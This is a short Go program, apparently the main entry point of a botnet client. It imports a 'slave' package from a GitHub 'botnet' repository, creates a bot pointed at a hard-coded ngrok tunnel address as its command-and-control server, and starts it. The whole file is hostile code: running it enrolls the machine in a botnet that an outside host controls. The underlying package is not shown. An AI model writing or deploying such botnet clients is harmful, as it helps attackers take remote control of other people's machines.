package main

import (
	"github.com/adrianosela/botnet/slave"
	"log"
)

func main() {
	slave, err := slave.NewBotnetSlave("de6479f2.ngrok.io")
	if err != nil {
		log.Fatal(err)
	}
	slave.Start()
}
